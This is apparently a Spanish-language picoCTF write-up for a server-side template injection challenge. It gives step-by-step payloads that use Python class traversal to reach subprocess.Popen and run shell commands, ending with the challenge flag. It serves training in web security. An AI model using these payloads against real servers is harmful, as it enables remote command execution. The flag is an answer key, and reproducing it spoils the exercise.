## Descripción del reto
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:63907/)!

## Solución
- Al principio nos mostrara una pagina en la cual si escribimos una palabra, la mostrara en pantalla.
![[Pasted image 20251008212800.png]]

- Primero identificamos con esta operación `{{7*7}}`, si la pagina es vulnerable.
![[Pasted image 20251008212820.png]]
![[Pasted image 20251008212836.png]]

- Sabiendo que es vulnerable, ingresamos lo siguiente `{{ ''.__class__.__mro__[1].__subclasses__() }}` para demostrar que la pagina es vulnerable a SSTI.
![[Pasted image 20251008212912.png]]

- Después buscamos los siguiente `<class 'subprocess.Popen'>`, con este registro, obviamente buscando por cada uno de los chunks de la siguiente manera:
	- `{{ ''.__class__.__mro__[1].__subclasses__()[0:50] }}`
	- `{{ ''.__class__.__mro__[1].__subclasses__()[50:100] }}`
	- `{{ ''.__class__.__mro__[1].__subclasses__()[100:150] }}`


- Luego ingresaremos lo siguiente `{{ ''.__class__.__mro__[1].__subclasses__()[350:400] }}` y este sera el resultado `[<class 'decimal.Decimal'>, <class 'decimal.Context'>, <class 'decimal.SignalDictMixin'>, <class 'decimal.ContextManager'>, <class 'numbers.Number'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>,......]`.
![[Pasted image 20251008212948.png]]

- Una vez verificado eso, ingresaremos lo siguiente `{{ ''.__class__.__mro__[1].__subclasses__()[356]('ls',shell=True,stdout=-1).communicate() }}`, y este sera la salida `# (b'__pycache__\napp.py\nflag\nrequirements.txt\n', None)`.
![[Pasted image 20251008213018.png]]

- Por ultimo ingresaremos esto ultimo para leer la bandera `{{ ''.__class__.__mro__[1].__subclasses__()[356]('cat flag',shell=True,stdout=-1).communicate() }}`.
![[Pasted image 20251008213040.png]]

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}

## Notas


## Referencia